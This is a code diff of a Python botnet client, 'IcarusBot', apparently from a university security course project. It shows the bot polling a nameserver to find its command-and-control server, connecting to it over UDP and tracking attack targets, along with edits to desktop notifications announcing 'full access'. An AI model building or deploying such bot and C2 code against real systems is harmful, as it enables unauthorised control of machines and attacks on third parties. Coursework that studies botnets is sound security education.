@@ -36,8 +36,6 @@ class IcarusBot:
         BOT_ID_NAME = file.read()
         print(BOT_ID_NAME, "IS RUNNING")
 
-
-        # self.update_thread = threading.Timer(3.0, self.update)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
@@ -47,16 +45,14 @@ class IcarusBot:
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
-        #signal.signal(signal.SIGINT, self.exit_gracefully)
-        #signal.signal(signal.SIGTERM, self.exit_gracefully)
-        # This is where we load the config file regarding the bot's ID
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
-        self.sock.settimeout(30)
-
+        self.sock.settimeout(8)
+        notification(self.status)
         while True:
+            print("contacting nameserver")
             nameserver_available = False
             # This will loop until the nameserver has an answer.
             while not nameserver_available:
@@ -67,6 +63,7 @@ class IcarusBot:
                     nameserver_available = True
                 time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
+            print("nameserver found")
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
@@ -152,7 +149,7 @@ class IcarusBot:
             except timeout or Exception:
                 # the server has lagged out
                 print("timeout")
-                break
+                return
 
     #
     # def lookup(self):
@@ -182,7 +179,7 @@ def notification(action):
     body = ""
     if action == "STARTED":
         title = "ICARUS BOT STARTED"
-        body = "If you didn't expect this - whoops"
+        body = "I NOW HAVE FULL ACCESS TO YOUR SYSTEMS (COMS4507)"
     elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
         body = "The bot gave in to peer pressure and is attacking something"
@@ -193,6 +190,7 @@ def notification(action):
     toast.show_toast(
         title,
         body,
+        icon_path="icarus.ico",
         duration=5,
         threaded=True,
     )
